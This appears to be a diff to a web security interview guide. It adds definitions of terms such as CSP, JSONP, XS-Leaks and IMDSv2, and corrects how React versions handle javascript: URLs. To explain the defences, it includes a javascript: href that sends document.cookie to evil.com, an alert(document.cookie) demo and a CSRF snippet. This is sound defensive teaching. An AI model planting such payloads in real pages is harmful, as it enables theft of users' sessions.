@@ -40,11 +40,13 @@ Almost every web vulnerability is one of three failures:
                          (supply chain, malicious dependency, third-party script)
 ```
 
+(A *principal* is whoever a request acts on behalf of — a user, a service, an API key. IDOR, insecure direct object reference, is §5.4: changing an ID in a URL and getting someone else's data.)
+
 Naming which category an attack belongs to is a strong interview move, because the *defence* follows from the category. Confused identity is fixed by verifying the principal at every operation. Confused data/code is fixed by keeping a strict separation between the two — parameterisation, escaping, contextual output encoding. Confused trust is fixed by reducing what you trust and constraining what it can reach.
 
 **The two principles that generate most correct answers:**
 
-**Defence in depth.** No single control is trusted to hold. A CSP does not excuse unsanitised HTML; `SameSite` cookies do not excuse a missing CSRF token; a WAF does not excuse an unparameterised query. Interviewers probe this by asking "what if that fails?" — a candidate with only one layer has no answer.
+**Defence in depth.** No single control is trusted to hold. A CSP does not excuse unsanitised HTML; `SameSite` cookies do not excuse a missing CSRF token; a WAF (web application firewall, a filter in front of your server that blocks requests that look like attacks) does not excuse an unparameterised query. Interviewers probe this by asking "what if that fails?" — a candidate with only one layer has no answer.
 
 **The client is never a security boundary.** Anything running in a browser is under the user's control: hidden fields, disabled buttons, client-side validation, obfuscated JavaScript, a route guard. All of it is UX. Every rule must be enforced server-side, and this single sentence answers a surprising fraction of security questions.
 
@@ -52,7 +54,7 @@ Naming which category an attack belongs to is a strong interview move, because t
 
 ## 2. XSS
 
-XSS is executing attacker-controlled JavaScript in your origin. That matters because the attacker's script gets **everything the user has**: any token JavaScript can read, the ability to make authenticated requests as the user, the DOM, and the keyboard.
+XSS (cross-site scripting) is executing attacker-controlled JavaScript in your origin — the scheme, host and port your page is served from, which is the boundary the browser uses to decide what code can see what data. That matters because the attacker's script gets **everything the user has**: any token JavaScript can read, the ability to make authenticated requests as the user, the DOM, and the keyboard.
 
 ### 2.1 The Three Types
 
@@ -148,11 +150,11 @@ Anything assigning attacker-influenced data into one of these is a potential DOM
 
 ### 3.1 CSP Is Defence in Depth, Not a Fix
 
-CSP restricts what the browser will execute and load. It does not fix an injection — it limits what an injection can *do*. Reaching for CSP instead of fixing the sink is the wrong order; reaching for it *as well* is correct.
+CSP (Content Security Policy) is a response header listing which scripts, styles, frames and connections the browser may run or load for this page; anything not on the list is blocked. It does not fix an injection — it limits what an injection can *do*. Reaching for CSP instead of fixing the sink is the wrong order; reaching for it *as well* is correct.
 
 ### 3.2 A Policy Worth Recommending
 
-Host allowlists are largely obsolete — they're bypassable via JSONP endpoints and open redirects on allowlisted CDNs, and they're a maintenance burden. **Nonce-based with `strict-dynamic`** is the modern recommendation:
+Host allowlists (`script-src https://cdn.example.com`) are largely obsolete. They trust *everything* on an allowed host, and big CDNs and API hosts usually carry something an attacker can abuse — a JSONP endpoint (an old API style that wraps its response in a function name taken from the URL, so the attacker can make it return any function call they like as valid script) or an open redirect to the attacker's own file. They are also a maintenance burden. **Nonce-based with `strict-dynamic`** is the modern recommendation:
 
 ```
 Content-Security-Policy:
@@ -209,7 +211,7 @@ The strategic value is that it converts DOM XSS from "audit every sink forever, 
 
 ## 4. CSRF
 
-CSRF makes a victim's browser send an authenticated request the victim didn't intend. It works because **cookies are attached automatically** by the browser based on the destination, regardless of which site initiated the request.
+CSRF (cross-site request forgery) makes a victim's browser send an authenticated request the victim didn't intend. It works because **cookies are attached automatically** by the browser based on the destination, regardless of which site initiated the request.
 
 ```html
 <!-- On evil.com. The victim's session cookie for bank.com rides along. -->
@@ -303,7 +305,7 @@ The **`__Host-` prefix** is underused and worth naming: a cookie named `__Host-s
 - **Handle the concurrent-refresh race.** Two tabs refreshing simultaneously must not each rotate and invalidate the other's token. Single-flight with a shared promise, plus cross-tab coordination via `BroadcastChannel` or `navigator.locks`.
 - **Regenerate the session ID on privilege change** — login, and any elevation. Otherwise you're vulnerable to **session fixation**, where an attacker plants a known session ID before the victim logs in and inherits the authenticated session.
 - **Revocation must be real.** A stateless JWT cannot be revoked before it expires, which is the central JWT trade-off: you gain not hitting the database on every request, and you lose the ability to log someone out. The usual resolutions are short lifetimes plus a revocation list for the exceptional case, or an opaque session token with a server-side store (which is the right default for most products).
-- **Validate JWTs properly.** Verify the signature, and **pin the expected algorithm** — accepting the token's own `alg` header enables the `alg: none` and RS256→HS256 confusion attacks. Check `exp`, `iss`, `aud`, and the key ID against your JWKS. Details in the OAuth & SSO guide.
+- **Validate JWTs properly.** Verify the signature, and **pin the expected algorithm** — accepting the token's own `alg` header enables the `alg: none` and RS256→HS256 confusion attacks. Check `exp` (expiry), `iss` (issuer), `aud` (audience — which service the token was issued for), and the key ID against your JWKS (JSON Web Key Set, the identity provider's published list of signing keys). Details in the OAuth & SSO guide.
 
 ### 5.4 IDOR — The Most Common Real Vulnerability
 
@@ -372,7 +374,7 @@ npm audit --audit-level=high # gate the build
 ```
 
 - **Commit lockfiles and install from them.** `npm ci` fails if the lockfile and `package.json` disagree, which is the point.
-- **`--ignore-scripts` by default.** Most packages don't need install scripts; the ones that do (native builds) can be allowlisted. This single flag removes the entire install-time RCE class.
+- **`--ignore-scripts` by default.** Most packages don't need install scripts; the ones that do (native builds) can be allowlisted. This single flag removes the entire install-time RCE (remote code execution — an attacker's code running on your machine) class.
 - **Verify provenance.** Packages published with provenance attestation prove which repo and workflow built them. Verifying it defeats a lot of account-compromise scenarios.
 - **Pin exact versions for anything sensitive**, and use `overrides`/`resolutions` to force a patched transitive dependency.
 - **Renovate/Dependabot with a review gate** — automated *detection*, human *merge*. Auto-merging dependency updates is auto-merging supply-chain risk.
@@ -504,6 +506,8 @@ X-Frame-Options: DENY
 ```
 
 Notes worth having: **`X-XSS-Protection` is obsolete** — the browser XSS auditors it controlled were removed for being bypassable and themselves exploitable; set it to `0` or omit it. **HSTS `preload` is close to irreversible**, so don't add it until every subdomain is HTTPS-ready. And **`COOP`/`COEP` break third-party embeds** that don't send CORP headers, so roll them out in report-only mode first.
+
+The two attacks named in the isolation comment: **XS-Leaks** (cross-site leaks) let a hostile page infer facts about your site — whether a user is logged in, whether a search returned results — from side effects it *can* observe, such as window counts, load timing or error events, without ever reading your responses. **Spectre** is a CPU-level flaw that lets code read memory it should not, which in a browser means another origin's data sitting in the same process. Cross-origin isolation helps against both: COOP cuts the window link a hostile page could use to probe yours, and COEP means your page only loads cross-origin resources that have opted in, so the browser can give it a process of its own with no unconsenting data for a Spectre-style read to reach.
 
 
 ---
@@ -720,7 +724,7 @@ The defences, and the ordering matters because the obvious ones are insufficient
 6. **Cap response size and timeout**, so this isn't also a memory-exhaustion or slowloris vector.
 7. **Don't return the raw response.** A link preview needs a title, a description and an image URL — parse and return only those. Echoing the body back turns SSRF into a full read primitive.
 
-The control I'd argue for hardest, though, is **network-level**: run this fetcher in a **separate egress-only environment** with no route to internal networks and no instance-metadata access (or IMDSv2 with a hop limit of 1). Then a bypass in the application logic — and given the redirect and rebinding tricks, assume there will be one — reaches nothing worth having. That's the defence-in-depth answer, and it's what distinguishes an architectural response from a validation-function response.
+The control I'd argue for hardest, though, is **network-level**: run this fetcher in a **separate egress-only environment** with no route to internal networks and no instance-metadata access (or, on AWS, IMDSv2 — the metadata service version that requires first obtaining a session token with a `PUT` request, which a simple forged `GET` cannot do — with a hop limit of 1, so the token response cannot travel past the host into a container). Then a bypass in the application logic — and given the redirect and rebinding tricks, assume there will be one — reaches nothing worth having. That's the defence-in-depth answer, and it's what distinguishes an architectural response from a validation-function response.
 
 ---
 
@@ -740,9 +744,16 @@ function Profile({ user }) {
     </div>
   );
 }
+
+// Demo: the attacker controls their own profile fields
+function Demo() {
+  const user = { name: 'Mallory', website: 'javascript:alert(document.cookie)', avatar: '/avatar.png' };
+  return <Profile user={user} />;
+}
+render(<Demo />);
 ```
 
-**Answer:** `href={user.website}` — a `javascript:` URL executes when clicked. React escapes **text**, not URL schemes.
+**Answer:** `href={user.website}` — on React 18 and earlier, a `javascript:` URL executes when clicked, because React escapes **text**, not URL schemes. React 19 finally blocks `javascript:` URLs, but that closes one sink in one library, so the scheme allowlist below is still the fix.
 
 **Explanation:**
 
@@ -750,10 +761,10 @@ React's automatic escaping applies to text children and attribute *values*, whic
 
 ```jsx
 user.website = "javascript:fetch('https://evil.com?c='+document.cookie)";
-// Renders <a href="javascript:...">. Clicking it runs the script in your origin.
+// React 18 and earlier render <a href="javascript:...">. Clicking it runs the script in your origin.
 ```
 
-React 16+ warns about this in development and blocks some cases, but the reliable fix is your own **scheme allowlist**:
+React 16.9 to 18 only **warn in development** ("A future version of React will block javascript: URLs") and still render the URL unchanged. React 19 replaces it with `javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')`, in development and production builds alike — which is what Try it shows, since the playground runs React 19. The reliable fix is still your own **scheme allowlist**, because the same string is dangerous everywhere React is not in the path: `window.location = url`, `window.open(url)`, a server-rendered template, an email, or a codebase still on React 18:
 
 ```jsx
 function safeUrl(url) {
